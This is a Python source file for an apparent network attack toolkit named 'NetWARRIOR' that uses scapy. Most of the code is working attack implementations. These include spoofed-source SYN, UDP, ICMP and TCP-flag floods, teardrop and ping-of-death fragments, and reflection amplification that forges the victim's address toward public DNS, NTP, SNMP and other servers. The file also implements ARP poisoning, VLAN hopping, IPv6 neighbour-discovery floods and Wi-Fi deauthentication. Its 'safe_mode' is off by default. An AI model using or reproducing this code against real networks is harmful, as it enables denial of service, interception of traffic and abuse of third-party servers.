import os
import sys
import time
import socket
import random
import re
import threading
import queue
import shlex
import shutil
import subprocess
import html
import ipaddress
import platform
import collections
import datetime
import asyncio
import importlib.util
from typing import Optional, Dict, List, Iterable
from dataclasses import dataclass, field
from pathlib import Path
from io import StringIO

# ──────────────────────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
#
# Runs BEFORE any third-party import so a missing package produces a readable
# message and an install hint instead of a raw ModuleNotFoundError traceback.
# The keys are import names; the values are the pip package names (several
# differ, e.g. the `dns` module ships in the `dnspython` package).
# ──────────────────────────────────────────────────────────────────────────────
_REQUIRED = {
    "rich": "rich",
    "scapy": "scapy",
    "psutil": "psutil",
    "paramiko": "paramiko",
    "dns": "dnspython",
    "aiohttp": "aiohttp",
    "tomli_w": "tomli_w",
}
if sys.version_info < (3, 11):
    _REQUIRED["tomli"] = "tomli"


def check_deps():
    missing = sorted(
        pip_name for mod, pip_name in _REQUIRED.items()
        if importlib.util.find_spec(mod) is None
    )
    if missing:
        print("NetWARRIOR: missing dependencies -> " + ", ".join(missing))
        print("Install them with:\n    pip install " + " ".join(missing))
        sys.exit(1)


check_deps()

# TOML reader: stdlib tomllib on 3.11+, external tomli on older interpreters.
try:
    import tomllib as tomli
except ModuleNotFoundError:  # Python < 3.11
    import tomli
import tomli_w

_UVLOOP = False
if sys.platform != "win32":
    try:
        import uvloop
        _UVLOOP = True
    except ImportError:
        pass

import aiohttp
import psutil
import paramiko
import dns.resolver
import dns.reversename
import dns.zone
import dns.query

# Rich
from rich.console import Console, Group
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

# Scapy
from scapy.all import (
    IP, TCP, UDP, ICMP, Ether, ARP, send, sendp, sniff, srp, sr, sr1,
    rdpcap, fragment, Dot1Q, GRE, SCTP, SCTPChunkInit,
    IPv6, ICMPv6ND_NA, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr,
    DNS, DNSQR, DNSRR, RadioTap, Dot11, Dot11Deauth,
    Dot11Beacon, Dot11Elt, LLC, Raw, EAPOL, BOOTP, DHCP,
)

console = Console()

# ──────────────────────────────────────────────────────────────────────────────
# UTILITY
# ──────────────────────────────────────────────────────────────────────────────
class Utils:
    @staticmethod
    def rand_ip():
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    @staticmethod
    def rand_ipv6():
        return ":".join(f"{random.randint(0,0xffff):x}" for _ in range(8))
    @staticmethod
    def rand_mac():
        return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
    @staticmethod
    def rand_port():
        return random.randint(1024, 65535)
    @staticmethod
    def rand_payload(size=512):
        return os.urandom(size)
    @staticmethod
    def human_size(size):
        for unit in ['B','KB','MB','GB','TB']:
            if size < 1024:
                return f"{size:.2f} {unit}"
            size /= 1024
        return f"{size:.2f} PB"
    @staticmethod
    def format_duration(seconds):
        m, s = divmod(int(seconds), 60)
        h, m = divmod(m, 60)
        if h: return f"{h}h {m}m {s}s"
        if m: return f"{m}m {s}s"
        return f"{s}s"
    @staticmethod
    def get_hostname(ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None
    @staticmethod
    def get_mac(ip):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return None
    @staticmethod
    def get_default_gateway():
        try:
            if platform.system() == "Linux":
                out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL, text=True)
                parts = out.split()
                if "via" in parts:
                    return parts[parts.index("via") + 1]
            elif platform.system() == "Windows":
                out = subprocess.check_output(["route", "print", "0.0.0.0"], stderr=subprocess.DEVNULL, text=True)
                for line in out.splitlines():
                    if "0.0.0.0" in line and "Gateway" not in line:
                        parts = line.split()
                        if len(parts) >= 3 and parts[0] == "0.0.0.0":
                            return parts[2]
            elif platform.system() == "Darwin":
                out = subprocess.check_output(["netstat", "-rn"], stderr=subprocess.DEVNULL, text=True)
                for line in out.splitlines():
                    if "default" in line and "UG" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1]
        except Exception:
            pass
        return "192.168.1.1"

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG & STATE
# ──────────────────────────────────────────────────────────────────────────────
def _config_path() -> Path:
    """Per-user config location. Uses %APPDATA% on Windows, ~/.config elsewhere."""
    if sys.platform == "win32":
        base = os.environ.get("APPDATA") or (Path.home() / "AppData" / "Roaming")
        return Path(base) / "netwarrior" / "config.toml"
    base = os.environ.get("XDG_CONFIG_HOME") or (Path.home() / ".config")
    return Path(base) / "netwarrior" / "config.toml"


class Config:
    # name -> (coercion callable, default)
    _FIELDS = {
        "max_pps":          (int,   10000),
        "safe_mode":        (bool,  False),
        "default_duration": (int,   30),
        "interface":        (str,   None),
        "output_dir":       (Path,  Path("reports")),
        "log_level":        (str,   "INFO"),
        "dns_servers":      (list,  ["8.8.8.8", "1.1.1.1"]),
        "ssh_timeout":      (float, 5.0),
        "http_timeout":     (float, 10.0),
    }

    def __init__(self):
        for name, (_, default) in self._FIELDS.items():
            setattr(self, name, default)
        self._path = _config_path()
        self.load()

    def load(self):
        if not self._path.exists():
            return
        try:
            with open(self._path, "rb") as f:
                data = tomli.load(f)
        except Exception as e:
            console.print(f"[yellow]Config load failed ({e}); using defaults.[/]")
            return
        for k, v in data.items():
            spec = self._FIELDS.get(k)
            if spec is None:
                continue
            coerce, _ = spec
            try:
                setattr(self, k, None if v is None else coerce(v))
            except (TypeError, ValueError):
                pass  # keep the default for a malformed entry

    def save(self):
        self._path.parent.mkdir(parents=True, exist_ok=True)
        data = {}
        for k in self._FIELDS:
            v = getattr(self, k)
            if v is None:
                continue
            data[k] = str(v) if isinstance(v, Path) else v
        with open(self._path, "wb") as f:
            tomli_w.dump(data, f)

    # ── Safety guard ──────────────────────────────────────────────────────────
    def clamp_pps(self, pps: int) -> int:
        try:
            pps = int(pps)
        except (TypeError, ValueError):
            pps = 1000
        return max(1, min(pps, self.max_pps))

    def check_target(self, target: str) -> Optional[str]:
        """Return a rejection reason when safe_mode forbids this target, else None."""
        if not self.safe_mode:
            return None
        host = (target or "").strip()
        try:
            ip = ipaddress.ip_address(host)
        except ValueError:
            return None  # hostnames are not resolved here; only literal IPs are gated
        if ip.is_loopback:
            return "safe_mode: refusing to target loopback"
        if ip.is_multicast:
            return "safe_mode: refusing to target a multicast address"
        if ip.is_unspecified or ip.is_reserved:
            return "safe_mode: refusing to target a reserved address"
        if ip.version == 4 and ip.packed[-1] in (0, 255):
            return "safe_mode: refusing to target a network/broadcast address"
        return None

class NetworkContext:
    def __init__(self):
        self.ip = "0.0.0.0"
        self.mac = "00:00:00:00:00:00"
        self.gateway = "192.168.1.1"
        self.interface = "eth0"
        self.netmask = "255.255.255.0"
        self.dns_servers = ["8.8.8.8"]
        self._detect()

    def _detect(self):
        addrs = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        for name, snics in addrs.items():
            if name in stats and stats[name].isup and not name.startswith(("lo", "Loopback")):
                for a in snics:
                    if a.family == socket.AF_INET and not a.address.startswith("127."):
                        self.ip = a.address
                        self.netmask = a.netmask or "255.255.255.0"
                        self.interface = name
                    elif hasattr(psutil, "AF_LINK") and a.family == psutil.AF_LINK:
                        self.mac = a.address
                if self.ip != "0.0.0.0":
                    break
        if self.ip == "0.0.0.0":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 53))
                self.ip = s.getsockname()[0]
                s.close()
            except Exception:
                pass
        self.gateway = Utils.get_default_gateway()
        try:
            with open('/etc/resolv.conf', 'r') as f:
                dns = [line.split()[1] for line in f if line.startswith('nameserver')]
                if dns:
                    self.dns_servers = dns
        except Exception:
            pass

@dataclass
class AttackState:
    name: str
    running: bool = True
    packets_sent: int = 0
    packets_recv: int = 0
    bytes_sent: int = 0
    bytes_recv: int = 0
    start_time: float = field(default_factory=time.time)
    end_time: Optional[float] = None
    errors: int = 0
    findings: List[Dict] = field(default_factory=list)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def inc_sent(self, n=1):
        with self._lock:
            self.packets_sent += n
    def inc_recv(self, n=1):
        with self._lock:
            self.packets_recv += n
    def inc_bytes_sent(self, n):
        with self._lock:
            self.bytes_sent += n
    def inc_bytes_recv(self, n):
        with self._lock:
            self.bytes_recv += n
    def inc_errors(self, n=1):
        with self._lock:
            self.errors += n
    def add_finding(self, f):
        with self._lock:
            self.findings.append(f)
    def stop(self):
        with self._lock:
            self.running = False
            self.end_time = time.time()

    @property
    def duration(self) -> float:
        return (self.end_time or time.time()) - self.start_time


class AttackRegistry:
    def __init__(self):
        self._attacks: "collections.OrderedDict[str, AttackState]" = collections.OrderedDict()
        self._lock = threading.Lock()

    def create(self, name) -> AttackState:
        with self._lock:
            # Keep prior runs of the same attack for the session report instead of
            # silently overwriting them; disambiguate with a numeric suffix.
            key = name
            n = 2
            while key in self._attacks:
                key = f"{name}#{n}"
                n += 1
            att = AttackState(name=key)
            self._attacks[key] = att
            return att

    def get(self, name):
        with self._lock:
            return self._attacks.get(name)

    def snapshot(self) -> "List[AttackState]":
        with self._lock:
            return list(self._attacks.values())

    def stop_all(self):
        """Cooperatively stop every running attack. History is retained."""
        for a in self.snapshot():
            a.stop()

    def clear(self):
        with self._lock:
            self._attacks.clear()

    def active(self):
        with self._lock:
            return [n for n, a in self._attacks.items() if a.running]

    def total_packets(self):
        with self._lock:
            return sum(a.packets_sent for a in self._attacks.values())

    def total_bytes(self):
        with self._lock:
            return sum(a.bytes_sent for a in self._attacks.values())

class LogBus:
    def __init__(self, maxlen=500):
        self.logs = collections.deque(maxlen=maxlen)
        self._lock = threading.Lock()
    def add(self, msg, level="info", tag=""):
        with self._lock:
            self.logs.append({
                "time": datetime.datetime.now().strftime("%H:%M:%S"),
                "level": level,
                "tag": tag,
                "msg": msg
            })
    def get(self, n=50):
        with self._lock:
            return list(self.logs)[-n:]

# ──────────────────────────────────────────────────────────────────────────────
# ENGINE
# ──────────────────────────────────────────────────────────────────────────────
def _safe_len(pkt) -> int:
    try:
        return len(bytes(pkt))
    except Exception:
        return 0


def _bytelen(pkts) -> int:
    return sum(_safe_len(p) for p in pkts)


class RateLimiter:
    """Async token bucket. One consumer per limiter. Starts empty (no initial burst)."""
    def __init__(self, rate: float, burst: float = 0.0):
        self.rate = max(0.0, float(rate))
        # allow at most ~1s of accumulation so a stalled sender cannot bank a huge burst
        self.capacity = max(self.rate, 1.0)
        self.tokens = min(self.capacity, max(0.0, burst))
        self.last = asyncio.get_running_loop().time()

    async def acquire(self, n=1):
        if self.rate <= 0:
            return
        now = asyncio.get_running_loop().time()
        self.tokens = min(self.capacity, self.tokens + (now - self.last) * self.rate)
        self.last = now
        if self.tokens >= n:
            self.tokens -= n
            return
        deficit = n - self.tokens
        self.tokens = 0
        await asyncio.sleep(deficit / self.rate)
        self.last = asyncio.get_running_loop().time()


class AttackEngine:
    def __init__(self, config: Config, registry: AttackRegistry, log: LogBus, net: NetworkContext):
        self.config = config
        self.registry = registry
        self.log = log
        self.net = net
        self._stop = asyncio.Event()          # global shutdown (quit only)
        self._loop = asyncio.get_running_loop()

    def stop(self):
        """Global shutdown. Use registry.stop_all() to stop attacks without quitting."""
        self._stop.set()

    def _resolve_iface(self, iface: Optional[str]) -> Optional[str]:
        return iface or self.config.interface or None

    async def send_loop(self, packet_gen: Iterable, duration: float, pps: int,
                        attack_name: str, layer2: bool = False,
                        iface: Optional[str] = None):
        """
        Pull packets from `packet_gen` and transmit them at `pps` for `duration`
        seconds. Transmission is dispatched to a worker thread in small batches so
        the asyncio event loop (and therefore the UI and the stop command) stays
        responsive even at high packet rates.
        """
        pps = self.config.clamp_pps(pps)
        limiter = RateLimiter(pps)
        loop = asyncio.get_running_loop()
        deadline = loop.time() + max(0, duration)
        att = self.registry.get(attack_name)
        if att is None:
            return
        iface = self._resolve_iface(iface)
        # ~20 executor hand-offs per second keeps the loop responsive.
        batch_size = max(1, min(int(pps // 20) or 1, 512))
        gen = iter(packet_gen)

        def _flush(pkts):
            fn = sendp if layer2 else send
            try:
                fn(pkts, verbose=0, iface=iface)
                return len(pkts), _bytelen(pkts), 0
            except Exception:
                ok = nbytes = err = 0
                for p in pkts:
                    try:
                        fn(p, verbose=0, iface=iface)
                        ok += 1
                        nbytes += _safe_len(p)
                    except Exception:
                        err += 1
                return ok, nbytes, err

        try:
            while att.running and not self._stop.is_set() and loop.time() < deadline:
                batch = []
                stop = False
                for _ in range(batch_size):
                    try:
                        batch.append(next(gen))
                    except StopIteration:
                        stop = True
                        break
                    except Exception as e:
                        # a raised generator is dead; report and end the attack
                        self.log.add(f"{attack_name}: cannot build packet ({e})",
                                     level="error")
                        att.inc_errors()
                        stop = True
                        break
                if batch:
                    await limiter.acquire(len(batch))
                    try:
                        sent, nbytes, errs = await loop.run_in_executor(None, _flush, batch)
                    except Exception as e:
                        self.log.add(f"{attack_name}: send failed ({e})", level="error")
                        att.inc_errors(len(batch))
                        break
                    att.inc_sent(sent)
                    att.inc_bytes_sent(nbytes)
                    if errs:
                        att.inc_errors(errs)
                if stop:
                    break
        finally:
            att.stop()

# ──────────────────────────────────────────────────────────────────────────────
# ATTACKS – ALL 50+ (with unified signatures)
# ──────────────────────────────────────────────────────────────────────────────
class Attacks:
    def __init__(self, engine: AttackEngine, registry: AttackRegistry, log: LogBus, net: NetworkContext):
        self.engine = engine
        self.registry = registry
        self.log = log
        self.net = net

    # ---- Floods ----
    async def syn_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"syn_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"SYN flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="S",
                    seq=random.randint(0,4294967295), window=random.randint(1024,65535)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def udp_flood(self, target, port=80, duration=30, pps=1000, size=512, **kwargs):
        name = f"udp_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"UDP flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / UDP(sport=Utils.rand_port(), dport=port) / Utils.rand_payload(size)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def icmp_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"icmp_{target}"
        att = self.registry.create(name)
        self.log.add(f"ICMP flood {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / ICMP() / Utils.rand_payload(56)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_ack_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_ack_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP ACK flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="A",
                    seq=random.randint(0,4294967295), ack=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_rst_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_rst_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP RST flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="R",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_xmas_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_xmas_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP XMAS flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="FPU",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_null_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_null_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP NULL flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags=0,
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_fin_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_fin_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP FIN flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="F",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_zero_window(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_zero_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP Zero-Window {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="A", window=0,
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def mac_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"mac_{target}"
        att = self.registry.create(name)
        self.log.add(f"MAC flood {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield Ether(src=Utils.rand_mac(), dst="ff:ff:ff:ff:ff:ff") / \
                      IP(src=Utils.rand_ip(), dst=target) / TCP(sport=Utils.rand_port(), dport=Utils.rand_port())
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    async def smurf(self, target, broadcast=None, duration=30, pps=1000, **kwargs):
        if broadcast is None:
            try:
                net = ipaddress.IPv4Network(f"{target}/24", strict=False)
                broadcast = str(net.broadcast_address)
            except Exception:
                broadcast = "255.255.255.255"
        name = f"smurf_{target}"
        att = self.registry.create(name)
        self.log.add(f"Smurf {target} via {broadcast} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=target, dst=broadcast) / ICMP() / Utils.rand_payload(56)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def land(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"land_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"LAND {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=target, dst=target) / TCP(
                    sport=port, dport=port, flags="S",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def sctp_init_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"sctp_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"SCTP INIT flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / SCTP(
                    sport=Utils.rand_port(), dport=port, tag=0
                ) / SCTPChunkInit(init_tag=random.randint(1, 0xFFFFFFFF), a_rwnd=65535,
                                  n_out_streams=10, n_in_streams=10,
                                  init_tsn=random.randint(0, 0xFFFFFFFF))
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def teardrop(self, target, duration=30, pps=100, **kwargs):
        name = f"teardrop_{target}"
        att = self.registry.create(name)
        self.log.add(f"Teardrop {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                ip = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1, 65535))
                pkt = ip / Utils.rand_payload(2000)
                # fragsize must be a multiple of 8 or scapy emits malformed offsets
                yield from fragment(pkt, fragsize=488)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ping_of_death(self, target, duration=30, pps=100, **kwargs):
        name = f"pod_{target}"
        att = self.registry.create(name)
        self.log.add(f"Ping of Death {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                # 65507 is the largest ICMP echo payload that still yields a legal
                # 65535-byte datagram; anything larger cannot be built at all and
                # just raised on every send. Fragment it for delivery.
                pkt = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1, 65535)) / \
                      ICMP() / Utils.rand_payload(65507)
                yield from fragment(pkt, fragsize=1480)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    # ---- Amplification ----
    async def dns_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"dns_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"DNS amplification {target}", tag="AMP")
        servers = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222"]
        queries = [
            b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01",
            b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\xff\x00\x01",
        ]
        def gen():
            while True:
                server = random.choice(servers)
                q = random.choice(queries)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=53) / Raw(q)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ntp_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"ntp_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"NTP amplification {target}", tag="AMP")
        servers = ["pool.ntp.org","time.nist.gov","time.cloudflare.com","time.google.com"]
        ntp_payload = b"\x17\x00\x03\x2a" + b"\x00"*4
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=123) / Raw(ntp_payload)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def snmp_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"snmp_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"SNMP amplification {target}", tag="AMP")
        servers = ["1.1.1.1","8.8.8.8"]
        snmp_payload = bytes.fromhex("302e02010104067075626c6963a527020404e9e1a7020100020100301b300f060b2b0601020101010500300c06082b060102010105000500")
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=161) / Raw(snmp_payload)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def memcached_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"memcached_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"Memcached amplification {target}", tag="AMP")
        payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        servers = [self.net.gateway, "8.8.8.8"]
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=11211) / Raw(payload)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ssdp_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"ssdp_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"SSDP amplification {target}", tag="AMP")
        ssdp = b"M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n"
        def gen():
            while True:
                yield IP(src=target, dst="239.255.255.250") / UDP(sport=Utils.rand_port(), dport=1900) / Raw(ssdp)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def chargen_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"chargen_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"CHARGEN amplification {target}", tag="AMP")
        servers = [self.net.gateway, "8.8.8.8"]
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=19) / Raw(b"X")
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ssdp_discovery(self, duration=30, **kwargs):
        name = "ssdp_discovery"
        att = self.registry.create(name)
        self.log.add("SSDP discovery", tag="RECON")
        ssdp = b"M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
        def gen():
            while True:
                yield IP(dst="239.255.255.250") / UDP(sport=1900, dport=1900) / Raw(ssdp)
        await self.engine.send_loop(gen(), duration, 10, name)
        return att

    async def radius_pod(self, duration=30, **kwargs):
        name = "radius_pod"
        att = self.registry.create(name)
        self.log.add("RADIUS PoD broadcast", tag="ATTACK")
        payload = b"\x28" + b"\x00\x00\x18" + b"\x00"*16 + b"0"*4 + b"\x00\x00\x00\x01"
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst="255.255.255.255") / UDP(sport=Utils.rand_port(), dport=3799) / Raw(payload)
        await self.engine.send_loop(gen(), duration, 10, name)
        return att

    # ---- Layer 2 ----
    async def arp_poison(self, target, gateway=None, duration=30, **kwargs):
        if gateway is None:
            gateway = self.net.gateway
        name = f"arp_poison_{target}"
        att = self.registry.create(name)
        self.log.add(f"ARP poison {target} <-> {gateway}", tag="MITM")
        loop = asyncio.get_running_loop()
        target_mac, gw_mac = await asyncio.gather(
            loop.run_in_executor(None, Utils.get_mac, target),
            loop.run_in_executor(None, Utils.get_mac, gateway),
        )
        if not target_mac or not gw_mac:
            self.log.add(f"ARP poison aborted: could not resolve MAC for "
                         f"{target if not target_mac else gateway}", level="error")
            att.stop()
            return att
        def gen():
            while True:
                pkt1 = Ether(dst=target_mac, src=self.net.mac) / ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=self.net.mac)
                pkt2 = Ether(dst=gw_mac, src=self.net.mac) / ARP(op=2, pdst=gateway, hwdst=gw_mac, psrc=target, hwsrc=self.net.mac)
                yield pkt1
                yield pkt2
        await self.engine.send_loop(gen(), duration, 10, name, layer2=True)
        return att

    async def vlan_double_tag(self, target, target_vlan=10, native_vlan=1,
                              duration=30, pps=1000, **kwargs):
        name = f"vlan_{target}_{target_vlan}"
        att = self.registry.create(name)
        self.log.add(f"VLAN double-tag {target} (native {native_vlan} -> {target_vlan})", tag="L2")
        src_mac = self.net.mac
        def gen():
            while True:
                yield (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
                       Dot1Q(vlan=native_vlan) / Dot1Q(vlan=target_vlan) /
                       IP(src=self.net.ip, dst=target) /
                       TCP(sport=Utils.rand_port(), dport=80, flags="S",
                           seq=random.randint(0, 4294967295)))
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    async def l2_protocol_flood(self, proto_type, duration=30, pps=1000, **kwargs):
        name = f"l2_{proto_type}"
        att = self.registry.create(name)
        self.log.add(f"L2 {proto_type} flood", tag="L2")
        def gen():
            while True:
                if proto_type == "cdp":
                    yield Ether(dst="01:00:0c:cc:cc:cc", type=0x2000) / Utils.rand_payload(64)
                elif proto_type == "lldp":
                    yield Ether(dst="01:80:c2:00:00:0e", type=0x88cc) / Utils.rand_payload(64)
                elif proto_type == "stp":
                    stp = b"\x00\x00\x00\x00\x42\x42\x03" + Utils.rand_payload(40)
                    yield Ether(dst="01:80:c2:00:00:00") / LLC(dsap=0x42, ssap=0x42, ctrl=3) / Raw(stp)
                else:
                    break
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    # ---- IPv6 ----
    async def ipv6_ra_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"ipv6_ra_{target}"
        att = self.registry.create(name)
        self.log.add(f"IPv6 RA flood {target}", tag="IPV6")
        def gen():
            while True:
                # RA flags are M/O (managed/other-config); lifetime field is
                # `routerlifetime`. R/S/O and `lifetime` are NA/other-message fields.
                yield (IPv6(dst="ff02::1") /
                       ICMPv6ND_RA(M=1, O=1, routerlifetime=9000, retranstimer=1000) /
                       ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac()))
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ipv6_na_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"ipv6_na_{target}"
        att = self.registry.create(name)
        self.log.add(f"IPv6 NA flood {target}", tag="IPV6")
        def gen():
            while True:
                yield IPv6(dst=target) / ICMPv6ND_NA(R=1, S=1, O=1, tgt=Utils.rand_ipv6()) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ipv6_ns_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"ipv6_ns_{target}"
        att = self.registry.create(name)
        self.log.add(f"IPv6 NS flood {target}", tag="IPV6")
        def gen():
            while True:
                yield IPv6(dst=target) / ICMPv6ND_NS(tgt=Utils.rand_ipv6()) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    # ---- Wireless ----
    async def deauth(self, bssid, client="ff:ff:ff:ff:ff:ff", iface="wlan0mon", duration=30, pps=100, **kwargs):
        name = f"deauth_{bssid}"
        att = self.registry.create(name)
        self.log.add(f"Deauth {bssid} -> {client} on {iface}", tag="WIFI")
        def gen():
            while True:
                # deauth from AP to client, and from client to AP
                yield RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                yield RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True, iface=iface)
        return att

